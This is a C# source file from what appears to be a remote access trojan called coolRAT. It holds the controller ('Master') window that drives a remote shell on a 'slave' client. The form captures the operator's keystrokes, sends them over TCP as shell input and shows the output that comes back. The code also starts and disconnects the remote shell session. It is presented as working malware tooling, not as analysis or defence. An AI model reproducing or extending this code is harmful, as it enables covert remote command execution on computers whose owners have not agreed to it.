using coolRAT.Libs;
using coolRAT.Libs.PacketHandlers;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace coolRAT.Master
{
    public partial class ShellWindow : Form
    {
        public Guid Shell_UniqueId;
        public TcpConnection Shell_Connection;
        public Client SlaveClient;
        public PacketListenerLoop listenerLoop;
        public StringBuilder Input_Buffer;
        public Buffer_Timeout_Clock Buffer_Timeout_Clock;
        public ShellWindow(Guid shell_uniqueId, TcpConnection connection, Client client)
        {
            InitializeComponent();
            Shell_UniqueId = shell_uniqueId;
            Shell_Connection = connection;
            SlaveClient = client;
            Input_Buffer = new StringBuilder();
            Buffer_Timeout_Clock = new Buffer_Timeout_Clock(Shell_Connection, 100);

            Buffer_Timeout_Clock.Buffer = Input_Buffer;
            Task.Run(() => Buffer_Timeout_Clock.Clock_Tick());
            Task.Run(() => PacketListenerLoop.Spawn(Shell_Connection, new ShellEmulator_PacketHandler(ShellEmulator, Shell_Connection)));
            // Let the slave know that the master's shell emulator is ready
            this.Text = $"[Connected] Remote shell of client {SlaveClient.UniqueId}; Shell Id: {Shell_UniqueId}";
        }

        private void ShellWindow_Shown(object sender, EventArgs e)
        {
            Task.Run(() =>
            {
                Thread.Sleep(500);
                SetShellStatePacket setShellState = new SetShellStatePacket(SlaveClient.UniqueId, Shell_UniqueId, ShellState.Running);
                Shell_Connection.SendPacket(setShellState);
            });
            
        }
        public bool EventHandled = false;
        private void ShellEmulator_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter) 
            {
                Input_Buffer.Append("\n");
                EventHandled = true;
            }
            Buffer_Timeout_Clock.ResetClock = true;
            e.Handled = true;
        }

        private void ShellEmulator_KeyPress(object sender, KeyPressEventArgs e)
        {
             if(EventHandled)
            {
                EventHandled = false;
                return;
            }

            Input_Buffer.Append(e.KeyChar);
            Buffer_Timeout_Clock.ResetClock = true;
            e.Handled = true;
        }

        private void ShellWindow_FormClosing(object sender, FormClosingEventArgs e)
        {
            DisconnectShellPacket setShellStatePacket = new DisconnectShellPacket(SlaveClient.UniqueId, Shell_UniqueId);
            Shell_Connection.SendPacket(setShellStatePacket);
        }
    }

    public class Buffer_Timeout_Clock
    {
        public TcpConnection Shell_Connection;
        public StringBuilder Buffer;
        public bool ResetClock;
        public int Buffer_Timeout = 100;

        public Buffer_Timeout_Clock(TcpConnection shell_Connection, int buffer_Timeout)
        {
            Shell_Connection = shell_Connection;
            Buffer = new StringBuilder();
            ResetClock = false;
            Buffer_Timeout = buffer_Timeout;
        }

        public void Clock_Tick()
        {
            while(true)
            {
                Thread.Sleep(Buffer_Timeout);
                if (!ResetClock)
                {
                    if (Buffer.Length == 0) continue;
                    // Send buffer contents to the remote shell
                    Shell_IO_ChangedPacket shell_IO_Changed = new Shell_IO_ChangedPacket(ChangeType.Input, Buffer.ToString());
                    Shell_Connection.SendPacket(shell_IO_Changed);
                    Buffer.Clear();
                }
                else
                    ResetClock = false;
            }
        }
    }

    public class ShellEmulator_PacketHandler : PacketHandler
    {
        RichTextBox ShellEmulator;

        public ShellEmulator_PacketHandler(RichTextBox shellEmulator, TcpConnection connection) : base(connection)
        {
            ShellEmulator = shellEmulator;
        }

        public override void HandlePacket(object sender, string packet_raw)
        {
            Packet packet = Packet.Deserialize(packet_raw);
            if (packet.Type == "Shell_IO_ChangedPacket")
            {
                Shell_IO_ChangedPacket shell_IO_changed = Shell_IO_ChangedPacket.Deserialize(packet_raw);
                if (shell_IO_changed.ChangeType == ChangeType.Output)
                {
                    ShellEmulator.Parent.Invoke(new Action(() => {
                        char[] char_arr = shell_IO_changed.Change.ToCharArray();
                        foreach(char chr in char_arr)
                        {
                            switch(chr)
                            {
                                case '\b':
                                    ShellEmulator.Text = new string(ShellEmulator.Text.ToCharArray().Reverse().Skip(1).Reverse().ToArray());
                                    break;
                                case '\r':
                                    break;
                                default:
                                    ShellEmulator.Text += chr;
                                    break;
                            }
                        }
                        ShellEmulator.SelectionStart = ShellEmulator.Text.Length;
                        ShellEmulator.ScrollToCaret();
                    }));
                }
            }
        }
    }
}
